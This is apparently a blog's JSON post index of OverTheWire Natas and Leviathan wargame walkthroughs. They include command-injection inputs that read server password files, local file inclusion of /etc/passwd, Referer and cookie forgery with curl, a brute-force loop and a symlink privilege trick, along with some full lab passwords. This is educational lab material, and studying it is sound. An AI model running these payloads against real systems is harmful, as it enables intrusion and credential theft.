[ { "title": "Overthewire Natas Level 9 -> Level 10", "url": "/posts/natas10/", "categories": "overthewire, overthewire-natas", "tags": "overthewire, natas, web", "date": "2022-06-07 22:37:00 +0100", "snippet": "Solution for the Overthewire.org Natas level 9 -&gt; Level 10DescriptionUsername: natas10 URL: http://natas10.natas.labs.overthewire.orgSolutionVisit the url http://natas10.natas.labs.overthewire.org in the browser and we get a prompt for login.Use the username natas10 and the password obtained from the previous challenge.Once logged in we can see a text box and a search button and a message telling us that there is added security. They are now filtering the input.Just like the previous challenge when entering text into the box and clicking search button the app appears to search a file for the text we entered.What happens when we try the same method that was used in natas9 ?When we enter ‘;cat /etc/natas_webpass/natas10 #’ into the search box we do not get the password, we get the illegal character error message.Checking the View sourcecode link will show php code used for the search button.&lt;?$key = \"\";if(array_key_exists(\"needle\", $_REQUEST)) { $key = $_REQUEST[\"needle\"];}if($key != \"\") { if(preg_match('/[;|&amp;]/',$key)) { print \"Input contains an illegal character!\"; } else { passthru(\"grep -i $key dictionary.txt\"); }}?&gt;The php code takes our input and then makes a check for certain characters. If there is a ;, | or &amp; in the input we supply we get a message about illegal input else it uses passthru to execute the grep command with the text we entered.In the previous challenge we used a ; to be able to start a new command but this time we get an error message.Since we cannot use the same cannot use the same command as the natas9 we will need to manipulate grep to search for the file instead.The standard grep command is grep &lt;TEXT TO LOOK FOR&gt; &lt;PATH TO FILE&gt;.The ‘TEXT TO LOOK FOR’ does not need to be a specific word but can be a regular expression. This is helpful for us as we do not know password in natas11 password file.We want to make grep search for any text in the /etc/natas_webpass/natas11.By entering . /etc/natas_webpass/natas11 # into the search box we are making grep . search for any text /etc/natas_webpass/natas11 file path to search # comment out ‘dictionary.txt’ and stop grep from searching it.And we get the password.If we didn’t comment out dictionary.txt the entire dictionary would have been printed to the screen.This technique will also work for the natas9 challenge." }, { "title": "Overthewire Natas Level 8 -> Level 9", "url": "/posts/natas09/", "categories": "overthewire, overthewire-natas", "tags": "overthewire, natas, web", "date": "2022-05-26 22:00:00 +0100", "snippet": "Solution for the Overthewire.org Natas level 8 -&gt; Level 9DescriptionUsername: natas9 URL: http://natas9.natas.labs.overthewire.orgSolutionVisit the url http://natas9.natas.labs.overthewire.org in the browser and we get a prompt for login.Use the username natas9 and the password obtained from the previous challenge.Once logged in we can see a text box and a search buttonWhen entering text into the box and clicking search button the app appears to search a file for the text we entered.Checking the View sourcecode link will show php code used for the search button.&lt;? $key = \"\"; if(array_key_exists(\"needle\", $_REQUEST)) { $key = $_REQUEST[\"needle\"]; } if($key != \"\") { passthru(\"grep -i $key dictionary.txt\"); }?&gt;The php code takes our input and uses passthru to execute a command.The command is using grep to search a file for the text we entered.Because the php script is not sanitizing our input before passing it to grep we can use command injection to insert our own command and have it be executed.First we end the grep command by using a ; and then we can type our own command like cat to read the password file. The # is to comment out everything after our command otherwise the entire contents of dictionary.txt would also be printed to the screen.;cat /etc/natas_webpass/natas9 #Entering the command into the search box and clicking on search will give the password." }, { "title": "Overthewire Natas Level 7 -> Level 8", "url": "/posts/natas08/", "categories": "overthewire, overthewire-natas", "tags": "overthewire, natas, web", "date": "2022-05-25 16:15:00 +0100", "snippet": "Solution for the Overthewire.org Natas level 7 -&gt; Level 8DescriptionUsername: natas8 URL: http://natas8.natas.labs.overthewire.orgSolutionVisit the url http://natas8.natas.labs.overthewire.org in the browser and we get a prompt for login.Use the username natas8 and the password obtained from the previous challenge.Once logged in we can see an input box for entering a secret.When entering the wrong secret we get an error message.We can inspect the source code using the view sourcecode link.&lt;html&gt;&lt;head&gt;&lt;!-- This stuff in the header has nothing to do with the level --&gt;&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\"&gt;&lt;link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /&gt;&lt;link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" /&gt;&lt;script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"&gt;&lt;/script&gt;&lt;script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"&gt;&lt;/script&gt;&lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=\"http://natas.labs.overthewire.org/js/wechall.js\"&gt;&lt;/script&gt;&lt;script&gt;var wechallinfo = { \"level\": \"natas8\", \"pass\": \"&lt;censored&gt;\" };&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;natas8&lt;/h1&gt;&lt;div id=\"content\"&gt;&lt;?$encodedSecret = \"3d3d516343746d4d6d6c315669563362\";function encodeSecret($secret) { return bin2hex(strrev(base64_encode($secret)));}if(array_key_exists(\"submit\", $_POST)) { if(encodeSecret($_POST['secret']) == $encodedSecret) { print \"Access granted. The password for natas9 is &lt;censored&gt;\"; } else { print \"Wrong secret\"; }}?&gt;&lt;form method=post&gt;Input secret: &lt;input name=secret&gt;&lt;br&gt;&lt;input type=submit name=submit&gt;&lt;/form&gt;&lt;div id=\"viewsource\"&gt;&lt;a href=\"index-source.html\"&gt;View sourcecode&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;In the source code we can see php code that needs further inspection.&lt;?$encodedSecret = \"3d3d516343746d4d6d6c315669563362\";function encodeSecret($secret) { return bin2hex(strrev(base64_encode($secret)));}if(array_key_exists(\"submit\", $_POST)) { if(encodeSecret($_POST['secret']) == $encodedSecret) { print \"Access granted. The password for natas9 is &lt;censored&gt;\"; } else { print \"Wrong secret\"; }}?&gt;From reading the php script we can see that the secret we enter is passed to the encodeSecret() function and the output is compared tot eh encodedSecret variable.Since we have been given the encodedSecret and the function used to encode it we can reverse the process and find the plaintext secret.To find the plaintext we have to convert the hexadecimal encodedSecret to ascii string reverse the order of the ascii string and decode the resulting base64 string to get the plaintext.Using Python we can reverse the steps and find the plaintext secret.from base64 import b64decodefrom binascii import unhexlifyencoded_secret = '3d3d516343746d4d6d6c315669563362'# Convert from hexadecimal to asciiunhexed_secret = unhexlify(encoded_secret)# Reverse stringreverse_secret = unhexed_secret[::-1]# Decode the Base64 stringdecoded_base64 = b64decode(reverse_secret).decode()print(decoded_base64)Entering the plaintext into the text box will give the password for natas9." }, { "title": "Overthewire Natas Level 6 -> Level 7", "url": "/posts/natas07/", "categories": "overthewire, overthewire-natas", "tags": "overthewire, natas, web", "date": "2022-04-25 01:15:00 +0100", "snippet": "Solution for the Overthewire.org Natas level 6 -&gt; Level 7DescriptionUsername: natas7 URL: http://natas7.natas.labs.overthewire.orgSolutionVisit the url http://natas7.natas.labs.overthewire.org in the browser and we get a prompt for login.Use the username natas7 and the password obtained from the previous challenge.Once logged in we can see an a simple home page with 2 links.Clicking on Home shows us the same page but with extra text and the url being different.And click on About shows gives us a very similar page to Home.When we check the source code of any of the three pages we get essentially the same code.&lt;html&gt;&lt;head&gt;&lt;!-- This stuff in the header has nothing to do with the level --&gt;&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\"&gt;&lt;link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /&gt;&lt;link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" /&gt;&lt;script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"&gt;&lt;/script&gt;&lt;script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"&gt;&lt;/script&gt;&lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=\"http://natas.labs.overthewire.org/js/wechall.js\"&gt;&lt;/script&gt;&lt;script&gt;var wechallinfo = { \"level\": \"natas7\", \"pass\": \"7z3hEENjQtflzgnT29q7wAvMNfZdh0i9\" };&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;natas7&lt;/h1&gt;&lt;div id=\"content\"&gt;&lt;a href=\"index.php?page=home\"&gt;Home&lt;/a&gt;&lt;a href=\"index.php?page=about\"&gt;About&lt;/a&gt;&lt;br&gt;&lt;br&gt;this is the front page&lt;!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 --&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;In each of the three pages there is a comment telling us the location of the password file on the server.&lt;!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 --&gt;-Looking back at the urls in Home and About we can see there is a variable we can modify.http://natas7.natas.labs.overthewire.org/index.php?page=homeWhen we click on Home and About the value of the page variable changes.By using this can take advantage of it by using a technique call Local File Inclusion link which allows us to enter the location of files on the server and be able to display them on the webpage.We can test this by entering a file path that exists on all linux servers, the /etc/passwd file.The local file inclusion succeeded so now we can use the file path given to us in the source code of the webpages to obtain the password.Using the url of http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8 we get the password.DBfUBf**************************" }, { "title": "Overthewire Natas Level 5 -> Level 6", "url": "/posts/natas06/", "categories": "overthewire, overthewire-natas", "tags": "overthewire, natas, web", "date": "2022-04-21 23:15:00 +0100", "snippet": "Solution for the Overthewire.org Natas level 5 -&gt; Level 6DescriptionUsername: natas6URL: http://natas6.natas.labs.overthewire.orgSolutionVisit the url http://natas5.natas.labs.overthewire.org in the browser and we get a prompt for login.Use the username natas6 and the password obtained from the previous challenge.Once logged in we can see an input box asking for a secret and there is a link to view the source code.Entering the incorrect secret gives us a wrong secret message.Next let’s check the source code link.&lt;html&gt;&lt;head&gt;&lt;!-- This stuff in the header has nothing to do with the level --&gt;&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\"&gt;&lt;link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /&gt;&lt;link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" /&gt;&lt;script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"&gt;&lt;/script&gt;&lt;script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"&gt;&lt;/script&gt;&lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=\"http://natas.labs.overthewire.org/js/wechall.js\"&gt;&lt;/script&gt;&lt;script&gt;var wechallinfo = { \"level\": \"natas6\", \"pass\": \"&lt;censored&gt;\" };&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;natas6&lt;/h1&gt;&lt;div id=\"content\"&gt;&lt;?include \"includes/secret.inc\"; if(array_key_exists(\"submit\", $_POST)) { if($secret == $_POST['secret']) { print \"Access granted. The password for natas7 is &lt;censored&gt;\"; } else { print \"Wrong secret\"; } }?&gt;&lt;form method=post&gt;Input secret: &lt;input name=secret&gt;&lt;br&gt;&lt;input type=submit name=submit&gt;&lt;/form&gt;&lt;div id=\"viewsource\"&gt;&lt;a href=\"index-source.html\"&gt;View sourcecode&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;There is a lot of html code we have seen before in other challenges but in the middle there is a php script that is interesting.&lt;?include \"includes/secret.inc\"; if(array_key_exists(\"submit\", $_POST)) { if($secret == $_POST['secret']) { print \"Access granted. The password for natas7 is &lt;censored&gt;\"; } else { print \"Wrong secret\"; } }?&gt;This is the script that checks if the secret we inputted is the correct one.It is doing this by comparing our secret to a variable $secret.The script is also including a file secret.inc and we can check what is in that file by following the path.The url is http://natas6.natas.labs.overthewire.org/includes/secret.inc&lt;?$secret = \"FOEIUWGHFEEUHOFUOIU\";?&gt;The file contained the value of the secret. Entering the secret in the input box will give us the password for natas7.The password for natas7 is 7z3hEE**************************" }, { "title": "Overthewire Natas Level 4 -> Level 5", "url": "/posts/natas05/", "categories": "overthewire, overthewire-natas", "tags": "overthewire, natas, web", "date": "2022-04-20 22:35:00 +0100", "snippet": "Solution for the Overthewire.org Natas level 4 -&gt; Level 5DescriptionUsername: natas5URL: http://natas5.natas.labs.overthewire.orgSolutionVisit the url http://natas5.natas.labs.overthewire.org in the browser and we get a prompt for login.Use the username natas5 and the password obtained from the previous challenge.Once logged in we get an Access disallowed message.Checking the source code does not give any new information.In the previous challenge we looked at the HTTP headers so let’s check them again.Using curl --head --user &lt;USERNAME&gt;:&lt;PASSWORD&gt; --url &lt;URL&gt; syntax we can view the headers.$ curl --head --user natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq --url http://natas5.natas.labs.overthewire.orgHTTP/1.1 200 OKDate: Wed, 20 Apr 2022 23:55:42 GMTServer: Apache/2.4.10 (Debian)Set-Cookie: loggedin=0Content-Type: text/html; charset=UTF-8We can see in the headers that there is a cookie being set.Set-Cookie: loggedin=0Let’s set loggedin to 1 and see what differences occur.We can passed cookie data using the --cookie option in curl.curl --user natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq --cookie \"loggedin=1\" --url http://natas5.natas.labs.overthewire.org/The response we get tells us Access granted and the password.&lt;html&gt;&lt;head&gt;&lt;!-- This stuff in the header has nothing to do with the level --&gt;&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\"&gt;&lt;link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /&gt;&lt;link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" /&gt;&lt;script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"&gt;&lt;/script&gt;&lt;script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"&gt;&lt;/script&gt;&lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=\"http://natas.labs.overthewire.org/js/wechall.js\"&gt;&lt;/script&gt;&lt;script&gt;var wechallinfo = { \"level\": \"natas5\", \"pass\": \"iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq\" };&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;natas5&lt;/h1&gt;&lt;div id=\"content\"&gt;Access granted. The password for natas6 is aGoY4q**************************&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;The password for the next challenge is aGoY4q**************************." }, { "title": "Overthewire Natas Level 3 -> Level 4", "url": "/posts/natas04/", "categories": "overthewire, overthewire-natas", "tags": "overthewire, natas, web", "date": "2022-04-20 20:35:00 +0100", "snippet": "Solution for the Overthewire.org Natas level 3 -&gt; Level 4DescriptionUsername: natas4URL: http://natas4.natas.labs.overthewire.orgSolutionVisit the url http://natas4.natas.labs.overthewire.org in the browser and we get a prompt for login.Use the username natas4 and the password obtained from the previous challenge.After logging in we get a message saying “Access disallowed”.The message further goes on to say that authorized users need to come from “http://natas5.natas.labs.overthewire.org”Checking the source code of the page does not give any new information.&lt;html&gt;&lt;head&gt;&lt;!-- This stuff in the header has nothing to do with the level --&gt;&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\"&gt;&lt;link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /&gt;&lt;link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" /&gt;&lt;script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"&gt;&lt;/script&gt;&lt;script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"&gt;&lt;/script&gt;&lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=\"http://natas.labs.overthewire.org/js/wechall.js\"&gt;&lt;/script&gt;&lt;script&gt;var wechallinfo = { \"level\": \"natas4\", \"pass\": \"Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ\" };&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;natas4&lt;/h1&gt;&lt;div id=\"content\"&gt;Access disallowed. You are visiting from \"\" while authorized users should come only from \"http://natas5.natas.labs.overthewire.org/\"&lt;br/&gt;&lt;div id=\"viewsource\"&gt;&lt;a href=\"index.php\"&gt;Refresh page&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;Going back to the message, how does the browser know what page we came from ? Information like that is passed in the http header.The Mozilla developer site is a good resource for checking what headers are available. Mozilla Developer.After reading through the headers we find what we are looking for.Referer: The address of the previous web page from which a link to the currently requested page was followed.The Referer header tells the page we visit where we came from.So now we need to send a request to the natas4 page while setting our own referer value. We can do this using a command line tool curl.curl is a tool for transferring data from or to a server and supports user authentication, cookies and setting header values.User this curl command we get the password.$curl --user natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ --referer http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org/ curl --user natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ –authentication using username:password format --referer http://natas5.natas.labs.overthewire.org/ –set the referer header to the natas5 url http://natas4.natas.labs.overthewire.org/ the url we are visting.Since curl is a command line program we get the html source code back.&lt;html&gt;&lt;head&gt;&lt;!-- This stuff in the header has nothing to do with the level --&gt;&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\"&gt;&lt;link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /&gt;&lt;link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" /&gt;&lt;script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"&gt;&lt;/script&gt;&lt;script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"&gt;&lt;/script&gt;&lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=\"http://natas.labs.overthewire.org/js/wechall.js\"&gt;&lt;/script&gt;&lt;script&gt;var wechallinfo = { \"level\": \"natas4\", \"pass\": \"Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ\" };&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;natas4&lt;/h1&gt;&lt;div id=\"content\"&gt;Access granted. The password for natas5 is iX6IOf**************************&lt;br/&gt;&lt;div id=\"viewsource\"&gt;&lt;a href=\"index.php\"&gt;Refresh page&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;Assuming the correct referer is set we get the password.Access granted. The password for natas5 is iX6IOf**************************" }, { "title": "Overthewire Natas Level 2 -> Level 3", "url": "/posts/natas03/", "categories": "overthewire, overthewire-natas", "tags": "overthewire, natas, web", "date": "2022-03-04 23:35:00 +0000", "snippet": "Solution for the Overthewire.org Natas level 2 -&gt; Level 3DescriptionUsername: natas3URL: http://natas3.natas.labs.overthewire.orgWalkthroughVisit the url http://natas3.natas.labs.overthewire.org in the browser and we get a prompt for login.Use the username natas3 and the password obtained from the previous challenge.The home page has a message stating nothing on the page.Next we check the source code Ctrl+U&lt;html&gt;&lt;head&gt;&lt;!-- This stuff in the header has nothing to do with the level --&gt;&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\"&gt;&lt;link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /&gt;&lt;link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" /&gt;&lt;script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"&gt;&lt;/script&gt;&lt;script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"&gt;&lt;/script&gt;&lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=\"http://natas.labs.overthewire.org/js/wechall.js\"&gt;&lt;/script&gt;&lt;script&gt;var wechallinfo = { \"level\": \"natas3\", \"pass\": \"sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14\" };&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;natas3&lt;/h1&gt;&lt;div id=\"content\"&gt;There is nothing on this page&lt;!-- No more information leaks!! Not even Google will find it this time... --&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;This time there is no password or images in the source code.We are given a clue as to where to look next in the comment.No more information leaks!! Not even Google will find it this time...The way to stop Google from indexing a site is to use a robots.txt file. The file is used to stop web crawlers from visiting the whole site or specific folders.We can see from the robots.txt that there is another directory to look into /s3cr3t/.The /s3cr3t/ directory contains a single document.Reading users.txt will give us the password for the next challenge.natas4:Z9tkRk**************************" }, { "title": "Overthewire Natas Level 1 -> Level 2", "url": "/posts/natas02/", "categories": "overthewire, overthewire-natas", "tags": "overthewire, natas, web", "date": "2022-03-04 22:55:00 +0000", "snippet": "Solution for the Overthewire.org Natas level 1 -&gt; Level 2DescriptionUsername: natas2URL: http://natas2.natas.labs.overthewire.orgWalkthroughVisit the url http://natas2.natas.labs.overthewire.org in the browser and we get a prompt for login.Use the username natas2 and the password obtained from the previous challenge.The home page has a message stating nothing on the page.Checking the source code with Ctrl+U we find an image tag for a file files/pixel.png&lt;html&gt;&lt;head&gt;&lt;!-- This stuff in the header has nothing to do with the level --&gt;&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\"&gt;&lt;link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /&gt;&lt;link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" /&gt;&lt;script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"&gt;&lt;/script&gt;&lt;script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"&gt;&lt;/script&gt;&lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=\"http://natas.labs.overthewire.org/js/wechall.js\"&gt;&lt;/script&gt;&lt;script&gt;var wechallinfo = { \"level\": \"natas2\", \"pass\": \"ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi\" };&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;natas2&lt;/h1&gt;&lt;div id=\"content\"&gt;There is nothing on this page&lt;img src=\"files/pixel.png\"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;When we visit the files directory we find more items to investigate.The password for natas3 is in the users.txt file." }, { "title": "Overthewire Natas Level 0 -> Level 1", "url": "/posts/natas01/", "categories": "overthewire, overthewire-natas", "tags": "overthewire, natas, web", "date": "2022-03-03 22:55:00 +0000", "snippet": "Solution for the Overthewire.org Natas level 0 -&gt; Level 1DescriptionUsername: natas1 URL: http://natas1.natas.labs.overthewire.orgWalkthroughVisit the url http://natas1.natas.labs.overthewire.org in the browser and we get a prompt for login.Use the username natas1 and the password obtained from the previous challenge.There is a message on the site stating that right clicking has been disabled.If we do try to right click the webpage we get an error message.So we need to use an alternative method to view the page source.On a Windows machine we can use Ctrl + U keyboard shortcut to view page source.&lt;html&gt;&lt;head&gt;&lt;!-- This stuff in the header has nothing to do with the level --&gt;&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\"&gt;&lt;link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /&gt;&lt;link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" /&gt;&lt;script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"&gt;&lt;/script&gt;&lt;script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"&gt;&lt;/script&gt;&lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=\"http://natas.labs.overthewire.org/js/wechall.js\"&gt;&lt;/script&gt;&lt;script&gt;var wechallinfo = { \"level\": \"natas1\", \"pass\": \"gtVrDuiDfck831PqWsLEZy5gyDz1clto\" };&lt;/script&gt;&lt;/head&gt;&lt;body oncontextmenu=\"javascript:alert('right clicking has been blocked!');return false;\"&gt;&lt;h1&gt;natas1&lt;/h1&gt;&lt;div id=\"content\"&gt;You can find the password for thenext level on this page, but rightclicking has been blocked!&lt;!--The password for natas2 is ZluruA************************** --&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;Like the first challenge the password is a comment in the source codeThe password for natas2 is ZluruA**************************" }, { "title": "Overthewire Natas Level 0", "url": "/posts/natas00/", "categories": "overthewire, overthewire-natas", "tags": "overthewire, natas, web", "date": "2022-03-03 22:35:00 +0000", "snippet": "Solution for the Overthewire.org Natas level 0DescriptionUsername: natas0Password: natas0URL: http://natas0.natas.labs.overthewire.orgWalkthroughVisit the url http://natas0.natas.labs.overthewire.org in the browser and we get a prompt for login.Use the username natas0 and password natas0 to login and begin the challenge.Since there is nothing to see on the site the next place to look is in the source code.Right click on the webpage and click on view page source.The password for natas1 is hidden as a comment in the source code of the page.&lt;html&gt;&lt;head&gt;&lt;!-- This stuff in the header has nothing to do with the level --&gt;&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\"&gt;&lt;link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /&gt;&lt;link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" /&gt;&lt;script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"&gt;&lt;/script&gt;&lt;script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"&gt;&lt;/script&gt;&lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=\"http://natas.labs.overthewire.org/js/wechall.js\"&gt;&lt;/script&gt;&lt;script&gt;var wechallinfo = { \"level\": \"natas0\", \"pass\": \"natas0\" };&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;natas0&lt;/h1&gt;&lt;div id=\"content\"&gt;You can find the password for the next level on this page.&lt;!--The password for natas1 is gtVrDu************************** --&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;The password for natas1The password for natas1 is gtVrDu**************************" }, { "title": "Overthewire Leviathan Level 7", "url": "/posts/leviathan7/", "categories": "overthewire, overthewire-leviathan", "tags": "overthewire, leviathan", "date": "2022-03-02 23:45:00 +0000", "snippet": "Solution for the Overthewire.org Leviathan level 7Level GoalThere is no information for this level, intentionally.WalkthroughLogin to the server using the password obtained from the previous level Leviathan level 6.username: leviathan7ssh leviathan7@leviathan.labs.overthewire.org -p 2223This is not an actual challenge so there is nothing to do except read a file.Checking the home directory there is a file CONGRATUALATION and reading the file will give a congratulation message.leviathan7@leviathan:~$ lsCONGRATULATIONSleviathan7@leviathan:~$ cat CONGRATULATIONS Well Done, you seem to have used a *nix system before, now try something more serious.That is the Leviathan series of challenges complete." }, { "title": "Overthewire Leviathan Level 6", "url": "/posts/leviathan6/", "categories": "overthewire, overthewire-leviathan", "tags": "overthewire, leviathan", "date": "2022-03-02 23:40:00 +0000", "snippet": "Solution for the Overthewire.org Leviathan level 6Level GoalThere is no information for this level, intentionally.WalkthroughLogin to the server using the password obtained from the previous level Leviathan level 5.username: leviathan6ssh leviathan6@leviathan.labs.overthewire.org -p 2223Check the home directory.leviathan6@leviathan:~$ ls -altotal 28drwxr-xr-x 2 root root 4096 Aug 26 2019 .drwxr-xr-x 10 root root 4096 Aug 26 2019 ..-rw-r--r-- 1 root root 220 May 15 2017 .bash_logout-rw-r--r-- 1 root root 3526 May 15 2017 .bashrc-r-sr-x--- 1 leviathan7 leviathan6 7452 Aug 26 2019 leviathan6-rw-r--r-- 1 root root 675 May 15 2017 .profileThere is an executable file leviathan6 with the suid bit set.When we run leviathan6 it tells us it expects a 4 digit code.leviathan6@leviathan:~$ ./leviathan6 usage: ./leviathan6 &lt;4 digit code&gt;We can brute force this using a bash script to generate all digits from 0000 to 9999leviathan6@leviathan:~$ for i in {0000..9999}; do ./leviathan6 $i; doneNow just wait while all digits are tested. When the correct one is used we get a new shell.WrongWrongWrongWrongWrongWrong$Using id we can see we have a shell as leviathan7. We can read the password file directly.$ iduid=12007(leviathan7) gid=12006(leviathan6) groups=12006(leviathan6)$ cat /etc/leviathan_pass/leviathan7ahy*******" }, { "title": "Overthewire Leviathan Level 5", "url": "/posts/leviathan5/", "categories": "overthewire, overthewire-leviathan", "tags": "overthewire, leviathan", "date": "2022-03-02 23:15:00 +0000", "snippet": "Solution for the Overthewire.org Leviathan level 5Level GoalThere is no information for this level, intentionally.WalkthroughLogin to the server using the password obtained from the previous level Leviathan level 4.username: leviathan5ssh leviathan5@leviathan.labs.overthewire.org -p 2223With no description given first thing we do is check what is in the home directory.leviathan5@leviathan:~$ ls -altotal 28drwxr-xr-x 2 root root 4096 Aug 26 2019 .drwxr-xr-x 10 root root 4096 Aug 26 2019 ..-rw-r--r-- 1 root root 220 May 15 2017 .bash_logout-rw-r--r-- 1 root root 3526 May 15 2017 .bashrc-r-sr-x--- 1 leviathan6 leviathan5 7560 Aug 26 2019 leviathan5-rw-r--r-- 1 root root 675 May 15 2017 .profileThere is an executable file leviathan5 with the suid bit set.When we run leviathan5 we get an error stating it cannot find file.log.leviathan5@leviathan:~$ ./leviathan5 Cannot find /tmp/file.logWhat happens if the file exists ? Let’s create the file.leviathan5@leviathan:~$ touch /tmp/file.logleviathan5@leviathan:~$ ./leviathan5Nothing seems to have happened and the file is now deleted.Let’s try again but this time put some text in the file.leviathan5@leviathan:~$ echo \"Hello\" &gt; /tmp/file.logleviathan5@leviathan:~$ ./leviathan5HelloThe contents of the file was printed to screen and the file then deleted.Since leviathan5 file runs with leviathan6 permissions we can create a symbolic link between the password file and file.log and print the password.leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.logleviathan5@leviathan:~$ ./leviathan5 Uga*******" }, { "title": "Overthewire Leviathan Level 4", "url": 